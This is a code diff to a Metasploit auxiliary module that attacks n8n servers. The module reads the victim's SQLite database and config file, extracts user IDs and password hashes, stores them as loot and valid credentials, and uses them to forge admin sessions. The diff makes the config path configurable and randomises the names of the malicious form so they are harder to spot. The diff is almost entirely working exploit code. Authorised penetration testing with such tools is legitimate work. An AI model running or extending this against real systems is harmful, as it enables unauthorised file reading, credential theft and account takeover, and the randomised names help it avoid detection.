@@ -33,6 +33,7 @@ class MetasploitModule < Msf::Auxiliary
     )
     register_options([
       OptString.new('TARGET_EMAIL', [false, 'A target user for spoofed session, when EXTRACT_ADMIN_SESSION action is set'], conditions: ['ACTION', '==', 'EXTRACT_SESSION']),
+      OptString.new('N8N_CONFIG_DIR', [false, 'Absolute path to n8n config directory', '/home/node/.n8n/'], conditions: ['ACTION', '==', 'EXTRACT_SESSION']),
       OptString.new('TARGET_FILENAME', [false, 'A target filename, when READ_FILE action is set'], conditions: ['ACTION', '==', 'READ_FILE']),
       OptString.new('USERNAME', [true, 'Username of n8n (email address)']),
       OptString.new('PASSWORD', [true, 'Password of n8n'])
@@ -107,11 +108,11 @@ class MetasploitModule < Msf::Auxiliary
       nodes: [
         {
           parameters: {
-            formTitle: 'Superform',
+            formTitle: Rex::Text.rand_text_alphanumeric(8),
             formFields: {
               values: [
                 {
-                  fieldLabel: 'Superfield',
+                  fieldLabel: Rex::Text.rand_text_alphanumeric(8),
                   fieldType: 'file'
                 }
               ]
@@ -316,7 +317,7 @@ class MetasploitModule < Msf::Auxiliary
       fail_with(Failure::BadConfig, 'Target email needs to be set') if target_email.blank?
       fail_with(Failure::BadConfig, 'Target email should be valid email') unless valid_username?(target_email)
 
-      db_content = read_file('/home/node/.n8n/database.sqlite')
+      db_content = read_file("#{datastore['N8N_CONFIG_DIR']}/database.sqlite")
 
       db_loot_name = store_loot('database.sqlite', 'application/x-sqlite3', datastore['rhosts'], db_content)
 
@@ -330,7 +331,12 @@ class MetasploitModule < Msf::Auxiliary
       print_good("Extracted user ID: #{user_id}")
       print_good("Extracted password hash: #{password_hash}")
 
-      config_content = read_file('/home/node/.n8n/config')
+      store_valid_credential(
+        user: target_email,
+        private: password_hash
+      )
+
+      config_content = read_file("#{datastore['N8N_CONFIG_DIR']}/config")
 
       config_name = store_loot('n8n.config', 'plain/text', datastore['rhosts'], config_content)
       print_good("Config file saved to: #{config_name}")
